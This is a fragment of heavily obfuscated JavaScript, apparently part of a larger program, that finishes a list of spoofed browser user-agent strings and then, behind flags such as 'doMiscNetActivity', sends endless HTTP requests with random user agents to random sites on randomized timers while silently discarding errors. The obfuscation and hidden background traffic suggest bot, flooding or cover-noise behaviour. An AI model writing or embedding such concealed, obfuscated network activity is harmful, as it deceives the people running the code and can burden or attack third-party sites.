      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1 * 0x718 + 0xd4 * 0x18 + -0xcc8; k < 0x1 * -0x311 + 0x9 * -0xd6 + 0xa9b; k++)
    setTimeout(f, (-0xffbb * -0x1 + 0x17974 + -0x18ecf) * k * getRandomInt(-0x19 * 0x18d + 0x3 * -0x4b3 + -0x1 * -0x34df, -0x2 * -0x9f3 + -0x88 * -0x48 + -0x1 * 0x3a23));
  setInterval(() => {
    f();
    for (let l = 0x2409 + 0x9 * -0x40a + 0x3 * 0x1b; l < 0xcdf + -0x1c90 + 0xfb5; l++)
      setTimeout(f, (-0xf1a0 + 0x44cd + 0x19733 * 0x1) * l * getRandomInt(-0x2221 + 0x1571 + 0x39 * 0x39, 0x1 * 0x1931 + 0x1103 * 0x1 + -0x7 * 0x607));
  }, -0x7 * 0xa4dbc + -0x1d * 0x7ad1 + 0x8cf851);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x5 * -0x359 + 0x5a4 + 0x4f7) * getRandomInt(0x21b9 * -0x1 + 0x7 * 0x3d3 + 0x6f5, -0x2452 * 0x1 + -0x2090 + 0x44e7));
}, 0x143 + -0x19 * 0x19 + -0x43 * -0x6);